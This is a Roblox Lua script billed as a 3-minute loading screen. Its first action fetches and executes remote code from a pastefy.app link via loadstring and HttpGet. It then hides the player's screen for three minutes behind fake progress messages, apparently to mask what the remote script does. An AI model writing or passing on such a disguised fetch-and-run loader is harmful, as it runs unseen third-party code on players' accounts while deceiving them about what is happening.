-- Cool 3-minute loading screen for Roblox
-- Execute your script first, then show loading screen
-- Replace the URL below with your actual script URL

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

-- Execute the script first, before showing the loading screen
loadstring(game:HttpGet("https://pastefy.app/3T7FFNLU/raw"))()

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Create the loading GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LoadingScreen"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

-- Main frame
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(1, 0, 1, 0)
mainFrame.Position = UDim2.new(0, 0, 0, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

-- Title
local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(0, 400, 0, 60)
titleLabel.Position = UDim2.new(0.5, -200, 0.3, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "INITIALIZING SYSTEM"
titleLabel.TextColor3 = Color3.fromRGB(0, 255, 150)
titleLabel.TextScaled = true
titleLabel.Font = Enum.Font.Code
titleLabel.Parent = mainFrame

-- Progress bar background
local progressBg = Instance.new("Frame")
progressBg.Size = UDim2.new(0, 500, 0, 20)
progressBg.Position = UDim2.new(0.5, -250, 0.5, 0)
progressBg.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
progressBg.BorderSizePixel = 0
progressBg.Parent = mainFrame

-- Progress bar fill
local progressFill = Instance.new("Frame")
progressFill.Size = UDim2.new(0, 0, 1, 0)
progressFill.Position = UDim2.new(0, 0, 0, 0)
progressFill.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
progressFill.BorderSizePixel = 0
progressFill.Parent = progressBg

-- Progress percentage
local percentLabel = Instance.new("TextLabel")
percentLabel.Size = UDim2.new(0, 100, 0, 30)
percentLabel.Position = UDim2.new(0.5, -50, 0.55, 0)
percentLabel.BackgroundTransparency = 1
percentLabel.Text = "0%"
percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
percentLabel.TextScaled = true
percentLabel.Font = Enum.Font.Code
percentLabel.Parent = mainFrame

-- Status text
local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(0, 600, 0, 30)
statusLabel.Position = UDim2.new(0.5, -300, 0.65, 0)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "Loading modules..."
statusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
statusLabel.TextScaled = true
statusLabel.Font = Enum.Font.Code
statusLabel.Parent = mainFrame

-- Spinning loader
local spinner = Instance.new("Frame")
spinner.Size = UDim2.new(0, 40, 0, 40)
spinner.Position = UDim2.new(0.5, -20, 0.75, 0)
spinner.BackgroundTransparency = 1
spinner.Parent = mainFrame

local spinnerImage = Instance.new("ImageLabel")
spinnerImage.Size = UDim2.new(1, 0, 1, 0)
spinnerImage.BackgroundTransparency = 1
spinnerImage.Image = "rbxasset://textures/loading/robloxTilt.png"
spinnerImage.Parent = spinner

-- Animate spinner rotation
local spinTween = TweenService:Create(
    spinnerImage,
    TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1),
    {Rotation = 360}
)
spinTween:Play()

-- Extended loading messages for 3 minutes
local loadingMessages = {
    "Initializing core systems...",
    "Loading security protocols...",
    "Establishing connections...",
    "Verifying permissions...",
    "Loading user interface...",
    "Configuring settings...",
    "Preparing environment...",
    "Loading assets...",
    "Optimizing performance...",
    "Checking for updates...",
    "Validating files...",
    "Synchronizing data...",
    "Calibrating systems...",
    "Loading modules...",
    "Initializing physics engine...",
    "Preparing rendering pipeline...",
    "Loading textures...",
    "Initializing audio systems...",
    "Configuring input handlers...",
    "Establishing secure connection...",
    "Loading player data...",
    "Finalizing setup...",
    "Almost ready...",
    "Completing final checks..."
}

-- Title glow effect
local titleGlow = TweenService:Create(
    titleLabel,
    TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
    {TextColor3 = Color3.fromRGB(0, 200, 255)}
)
titleGlow:Play()

-- Loading animation function
local function animateLoading()
    local startTime = tick()
    local duration = 180 -- 3 minutes (180 seconds)
    local messageIndex = 1
    local lastMessageTime = 0
    
    local connection
    connection = RunService.Heartbeat:Connect(function()
        local elapsed = tick() - startTime
        local progress = math.min(elapsed / duration, 1)
        
        -- Update progress bar
        local progressTween = TweenService:Create(
            progressFill,
            TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {Size = UDim2.new(progress, 0, 1, 0)}
        )
        progressTween:Play()
        
        -- Update percentage
        percentLabel.Text = math.floor(progress * 100) .. "%"
        
        -- Update status messages
        if elapsed - lastMessageTime > 7.5 and messageIndex <= #loadingMessages then
            statusLabel.Text = loadingMessages[messageIndex]
            messageIndex = messageIndex + 1
            lastMessageTime = elapsed
            
            -- Loop back to the beginning if we run out of messages
            if messageIndex > #loadingMessages then
                messageIndex = 1
            end
        end
        
        -- Complete loading
        if progress >= 1 then
            connection:Disconnect()
            
            -- Fade out effect
            local fadeOut = TweenService:Create(
                mainFrame,
                TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                {BackgroundTransparency = 1}
            )
            
            local fadeOutTitle = TweenService:Create(
                titleLabel,
                TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                {TextTransparency = 1}
            )
            
            local fadeOutPercent = TweenService:Create(
                percentLabel,
                TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                {TextTransparency = 1}
            )
            
            local fadeOutStatus = TweenService:Create(
                statusLabel,
                TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                {TextTransparency = 1}
            )
            
            fadeOut:Play()
            fadeOutTitle:Play()
            fadeOutPercent:Play()
            fadeOutStatus:Play()
            
            -- Remove the loading screen after fade out
            fadeOut.Completed:Connect(function()
                screenGui:Destroy()
            end)
        end
    end)
end

-- Start the loading animation
animateLoading()